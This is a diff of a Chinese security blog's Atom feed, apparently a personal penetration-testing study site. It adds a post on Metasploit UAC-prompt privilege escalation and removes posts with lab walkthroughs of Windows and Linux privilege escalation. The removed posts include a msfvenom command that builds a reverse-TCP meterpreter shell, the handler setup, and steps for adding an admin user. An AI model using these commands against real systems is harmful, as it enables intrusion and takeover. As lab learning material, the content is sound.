@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-11-25T12:03:13.259Z</updated>
+  <updated>2019-12-03T08:20:33.788Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,47 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>利用msf中的ask模块进行权限提升</title>
+    <link href="http://yoursite.com/2019/12/03/%E5%88%A9%E7%94%A8msf%E4%B8%AD%E7%9A%84ask%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
+    <id>http://yoursite.com/2019/12/03/利用msf中的ask模块进行权限提升/</id>
+    <published>2019-12-03T07:48:08.000Z</published>
+    <updated>2019-12-03T08:20:33.788Z</updated>
+    
+    <content type="html"><![CDATA[<p>权限提升的一种新的方式</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Kali：192.168.43.141<br>Win7：192.168.43.139</p><h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p>简单说一下，当你拿到meterpreter之后可能是一个低权限的用户，这个时候我们可以利用msf中的 exploit/windows/local/ask 模块，通过提高程序运行级别，进行权限提升</p><p>首先我们拿到一个低权限的meterpreter<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/low.png" alt></p><p>这里getsystem是报错的，接下来我们利用这个ask模块<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/setting.png" alt></p><p>这里我们可以 show options 来查看我们需要配置的内容，这里的FILENAME为我们伪装的程序的名称，最后我们进行运行<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/run.png" alt></p><p>然后我们看Win7上，会显示这个提示<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/wechat.png" alt><br>受害者这里输入密码或者点击确认之后，我们再来看meterpreter<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/system.png" alt><br>这样就达到提权的目的啦</p><p>然后总结一下msf提权的几个方向<br>1、通过提高程序的运行级别(就是这篇文章所讲的)<br>2、Bypassuac<br>3、提权漏洞进行提权</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;权限提升的一种新的方式&lt;/p&gt;
+&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;Kali：192.168.43.141&lt;br&gt;Win7：192.168.43.139&lt;/p&gt;
+&lt;h1 
+      
+    
+    </summary>
+    
+    
+    
+      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>post</title>
+    <link href="http://yoursite.com/2019/12/03/post/"/>
+    <id>http://yoursite.com/2019/12/03/post/</id>
+    <published>2019-12-03T07:46:10.000Z</published>
+    <updated>2019-12-03T07:46:10.885Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>Weblogic反序列化漏洞复现(CNVD-C-2019-48814)</title>
@@ -395,50 +436,6 @@
     <summary type="html">
     
       &lt;h1 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h1&gt;&lt;p&gt;Ubuntu 16.04(Linux Kernel Version 4.14-4.4)&lt;br&gt;Exp: &lt;a href=&quot;http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;amp;isappinstalled=0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;amp;isappinstalled=0&lt;/a&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>后渗透之meterpreter初体验</title>
-    <link href="http://yoursite.com/2019/10/14/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8Bmeterpreter%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
-    <id>http://yoursite.com/2019/10/14/后渗透之meterpreter初体验/</id>
-    <published>2019-10-14T08:32:51.000Z</published>
-    <updated>2019-10-14T08:59:24.840Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。</p><a id="more"></a><h1 id="获取一个meterpreter-Linux"><a href="#获取一个meterpreter-Linux" class="headerlink" title="获取一个meterpreter(Linux)"></a>获取一个meterpreter(Linux)</h1><ul><li>Kali:192.168.229.139</li><li>Ubuntu:192.168.229.135</li></ul><p>首先用 <strong>msfvenom</strong> 生成一个反弹shell的木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444  -f elf -o shell</span><br><span class="line"></span><br><span class="line">-p payload</span><br><span class="line">-f 输出的格式</span><br><span class="line">-o 输出的文件名</span><br></pre></td></tr></table></figure></p><p>然后将生成的木马搞到我们的目标机器上(这里就直接搬过去了)，放在了tmp目录下，一般这个目录下都会有可执行的权限，没有我们就(chmod +x shell)<br><img src="/2019/10/14/后渗透之meterpreter初体验/ubuntu.png" alt></p><p>然后我们打开msf控制台，使用我们的模块，并设定Payload和本地的ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.229.139</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/14/后渗透之meterpreter初体验/options.png" alt><br>然后我们在目标机器上运行我们的shell文件<br><img src="/2019/10/14/后渗透之meterpreter初体验/success.png" alt><br>这样就反弹成功啦~</p><p><img src="/2019/10/14/后渗透之meterpreter初体验/unavailable.png" alt><br>可能会出现这样的问题，就是我们设定的端口被占用了，要关闭端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fuser -k -n tcp 4444</span><br></pre></td></tr></table></figure></p><h1 id="Meterpreter基本命令"><a href="#Meterpreter基本命令" class="headerlink" title="Meterpreter基本命令"></a>Meterpreter基本命令</h1><p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p><p>meterpreter可以进行shell命令、提权、mimikatz抓取密码、屏幕截图、键盘记录等，挺方便的。后续再慢慢玩这些功能</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Windows pr提权</title>
-    <link href="http://yoursite.com/2019/10/12/Windows-pr%E6%8F%90%E6%9D%83/"/>
-    <id>http://yoursite.com/2019/10/12/Windows-pr提权/</id>
-    <published>2019-10-12T10:43:31.000Z</published>
-    <updated>2019-10-12T11:37:11.349Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Windows Server 2003 r2 Standard</li><li>IIS6.0 + asp<a id="more"></a></li></ul><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>BUGTRAQ  ID: 34443<br>CVE(CAN) ID: CVE-2009-0079</p><p>发布日期：2009-04-14<br>更新日期：2009-04-24</p><p>受影响系统：<br>Microsoft Windows XP x64 SP2<br>Microsoft Windows XP x64<br>Microsoft Windows XP SP3<br>Microsoft Windows XP SP2<br>Microsoft Windows Server 2003 SP2<br>Microsoft Windows Server 2003 SP1</p><p>也就是说只有Windows Server 2003和windows xp系统能够使用 pr 提权。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>当我们拿到shell之后上传一个大马方便进行操作<br><img src="/2019/10/12/Windows-pr提权/大马.png" alt></p><p>首先我们来看看这个时候的权限<br><img src="/2019/10/12/Windows-pr提权/cmd.png" alt><br>这里并不是administrator最高权限，我们上传我们的pr.exe文件上去，就在我们的网站目录下<br><img src="/2019/10/12/Windows-pr提权/prok.png" alt><br>上传之后将我们的prok.exe 重命名成cmd.exe了<br><img src="/2019/10/12/Windows-pr提权/success.png" alt><br>接下来我们运行这个文件<br><img src="/2019/10/12/Windows-pr提权/cmd_2.png" alt></p><p>这里权限已经提升了，添加一个新的用户<br><img src="/2019/10/12/Windows-pr提权/netuser.png" alt><br><img src="/2019/10/12/Windows-pr提权/cmd_3.png" alt><br><img src="/2019/10/12/Windows-pr提权/cmd_4.png" alt><br>已经是管理员权限了，接下来看看开的端口<br><img src="/2019/10/12/Windows-pr提权/3389.png" alt><br>(这里我手动开启了3389 ==)<br>然后远程桌面连接<br><img src="/2019/10/12/Windows-pr提权/mstsc.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
-&lt;li&gt;Windows Server 2003 r2 Standard&lt;/li&gt;
-&lt;li&gt;IIS6.0 + asp&lt;/li&gt;&lt;/ul&gt;
     
     </summary>
     
